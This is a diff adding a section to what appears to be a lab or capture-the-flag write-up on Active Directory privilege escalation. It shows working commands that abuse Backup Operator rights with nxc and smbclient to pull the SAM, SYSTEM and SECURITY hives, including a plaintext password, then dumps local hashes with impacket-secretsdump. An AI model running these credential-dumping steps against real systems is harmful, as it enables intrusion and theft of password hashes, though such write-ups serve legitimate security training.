@@ -58,6 +58,30 @@ Connected to Administrator with wmiexec.py
 ```
 
 ---
+## NXC Dumping
+
+I decided to use an in-built utility of nxc to dump sam, system & security file remotely with backup operator.
+
+```
+nxc smb 192.168.210.16 -u melissa -p 'WinterIsHere2022!' -M backup_operator
+```
+
+This saved the SAM, SYSTEM & SECURITY File in the SYSVOL SMB Share. Navigated there and downloaded all of them.
+
+```
+smbclient \\\\192.168.210.16/SYSVOL -U melissa
+mget SYSTEM
+mget SAM
+mget SECURITY
+```
+
+Dumped all local hashes.
+
+```
+impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY local
+```
+
+---
 # Getting Domain Hashes
 
 I need to get Domain Hashes. I can only get them by getting access to the so called NTDS.dit file. Since this file is getting used by the AD itself all the time, it can't be extracted.  We need to create a so called "shadow copy". The extraction o the domain hashes also requires the SYSTEM hive, which I already retrieved.
